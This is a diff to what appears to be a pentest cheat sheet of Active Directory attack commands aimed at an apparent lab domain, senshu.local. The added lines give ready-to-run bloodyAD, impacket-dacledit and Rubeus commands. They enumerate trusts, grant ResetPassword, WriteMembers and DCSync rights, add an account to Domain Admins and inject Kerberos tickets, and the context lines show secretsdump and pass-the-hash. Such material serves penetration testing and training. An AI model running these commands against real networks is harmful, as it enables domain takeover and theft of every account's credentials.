@@ -22,6 +22,14 @@ commands:
       # find ACEs across the domain where sec_user is the trustee — resolve GUIDs to human-readable names
       Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "sec_user"}
 
+      # bloodyAD: enumerate domain trusts — shows direction (inbound/outbound/bidirectional) and type
+      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get trusts
+      bloodyAD -d senshu.local -u sec_user -p aad3b435b51404eeaad3b435b51404ee:NTHASH --host 10.10.10.27 get trusts
+
+      # impacket-dacledit: read all ACEs on a specific object — enumerate who has what rights
+      impacket-dacledit senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -target targetuser -action read
+      impacket-dacledit senshu.local/sec_user -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH -dc-ip 10.10.10.27 -target targetuser -action read
+
       # ════════════════════════════════════════════════════════════════
       # [USER] ForceChangePassword / GenericAll — reset password
       # ════════════════════════════════════════════════════════════════
@@ -38,6 +46,10 @@ commands:
       # PowerView: convert new password to SecureString then push it to the target account
       $pass = ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force
       Set-DomainUserPassword -Identity targetuser -AccountPassword $pass -Credential $Cred
+
+      # impacket-dacledit: grant ResetPassword right on target — then use bloodyAD/rpcclient to set the password
+      impacket-dacledit senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -target targetuser -action write -rights ResetPassword
+      impacket-dacledit senshu.local/sec_user -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH -dc-ip 10.10.10.27 -target targetuser -action write -rights ResetPassword
 
       # ════════════════════════════════════════════════════════════════
       # [USER] GenericWrite — targeted Kerberoasting (set SPN → ticket → clean up)
@@ -95,6 +107,9 @@ commands:
 
       # certipy: authenticate with the generated PFX to get a TGT and NT hash
       certipy auth -pfx targetuser.pfx -dc-ip 10.10.10.27
+
+      # Rubeus: request TGT using the PFX certificate via PKINIT — injects ticket into current session
+      .\Rubeus.exe asktgt /user:targetuser /certificate:targetuser.pfx /password:certpass /domain:senshu.local /dc:DC01.senshu.local /ptt
 
       # ════════════════════════════════════════════════════════════════
       # [USER] GenericWrite — Logon Script (executes on next login)
@@ -161,6 +176,10 @@ commands:
 
       # PowerView: add sec_user into the group using explicit credentials
       Add-DomainGroupMember -Identity 'Domain Admins' -Members 'sec_user' -Credential $Cred
+
+      # impacket-dacledit: grant WriteMembers right on target group — then add member
+      impacket-dacledit senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -target "Domain Admins" -action write -rights WriteMembers
+      impacket-dacledit senshu.local/sec_user -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH -dc-ip 10.10.10.27 -target "Domain Admins" -action write -rights WriteMembers
 
       # ════════════════════════════════════════════════════════════════
       # [GROUP] WriteOwner — take ownership → grant GenericAll → add member
@@ -237,6 +256,9 @@ commands:
       # certipy: authenticate with the machine cert to get the NT hash — usable for S4U or PtH
       certipy auth -pfx TARGET.pfx -dc-ip 10.10.10.27
 
+      # Rubeus: request TGT for the machine account using its certificate — then use for S4U
+      .\Rubeus.exe asktgt /user:TARGET$ /certificate:TARGET.pfx /password:certpass /domain:senshu.local /dc:DC01.senshu.local /ptt
+
       # ════════════════════════════════════════════════════════════════
       # [COMPUTER] GenericAll — read LAPS local admin password
       # ════════════════════════════════════════════════════════════════
@@ -260,6 +282,10 @@ commands:
 
       # PowerView: grant the two DS-Replication extended rights required for DCSync
       Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=senshu,DC=local" -PrincipalIdentity sec_user -Rights DCSync -Verbose
+
+      # impacket-dacledit: write DCSync rights directly on the domain object
+      impacket-dacledit senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -target-dn "DC=senshu,DC=local" -action write -rights DCSync
+      impacket-dacledit senshu.local/sec_user -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH -dc-ip 10.10.10.27 -target-dn "DC=senshu,DC=local" -action write -rights DCSync
 
       # secretsdump: replicate all hashes from the DC using the newly granted DCSync rights
       impacket-secretsdump senshu.local/sec_user:'P@ssw0rd'@10.10.10.27
